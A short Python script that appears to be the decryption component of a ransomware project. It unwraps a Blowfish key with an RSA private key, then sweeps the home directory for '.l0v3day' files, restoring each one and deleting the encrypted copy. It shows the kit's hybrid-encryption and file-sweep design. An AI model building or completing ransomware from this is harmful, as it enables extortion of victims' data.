# Status - OK (Partial modification required)
from Crypto.Cipher import Blowfish
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Random import get_random_bytes
import os
import sys
import time
import colorama

class Decryptor:

    def __init__(self) -> None:
        self.privateKey = "RSA_PrivateKey.key"
        self.BlowfishKey = "symetric_key.key"

    # decrypt blowfish symetric key
    def Decrypt_Key_File(self): 
        with open(self.privateKey, "rb") as privKey:
            Private = privKey.read()

        with open(self.BlowfishKey, "rb") as bf:
            enc_file = bf.read()

        rsa = RSA.importKey(Private)
        cipher = PKCS1_v1_5.new(rsa)
        sentinel = get_random_bytes(16)

        return cipher.decrypt(enc_file, sentinel)

    # traverse the entire system from the suppplied root path
    def Traverse(self, root_dir, extension):
        found_files = []
        exclusion = os.path.dirname(sys.executable)
        
        for dirpath, dirnames, filenames in os.walk(root_dir):
            for filename in filenames:
                if filename.endswith(extension):
                    full_path = os.path.join(dirpath, filename)
                    if exclusion not in full_path:
                        found_files.append(full_path)
                    else:
                        continue
            
        return found_files
    
    # Decrypt files and write changes to disk
    def decrypt_file_ecb(self, input_file, key):
        output_file = input_file[:-8]
        cipher = Blowfish.new(key, Blowfish.MODE_ECB)
        
        with open(input_file, 'rb') as encrypted_file:
            encrypted_data = encrypted_file.read()
        
        decrypted_data = cipher.decrypt(encrypted_data)
        
        # Remove padding by reversing the padding process
        last_byte = decrypted_data[-1]
        padding_length = last_byte if type(last_byte) is int else ord(last_byte)
        decrypted_data = decrypted_data[:-padding_length]
        
        with open(output_file, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_data)
    

if __name__=='__main__':

    color = colorama.init()
    RED = colorama.Fore.RED
    GREEN = colorama.Fore.GREEN

    extension = ".l0v3day"
    root_dir = os.path.expanduser("~")

    decrypt = Decryptor()
    key = decrypt.Decrypt_Key_File()
    files_found = decrypt.Traverse(root_dir, extension)

    start_time = time.time()

    for file_path in files_found:
        try:
            if os.access(file_path, os.R_OK | os.W_OK):
                decrypt.decrypt_file_ecb(file_path,  key)
                os.remove(file_path)
                print(RED, file_path)
            else:
                continue
        except Exception as e:
            print(e)

    end_time = time.time()

    print(GREEN, f'[+] Total files decrypted : {len(files_found)}')
    print(f"[+]Total time = {end_time-start_time} secs")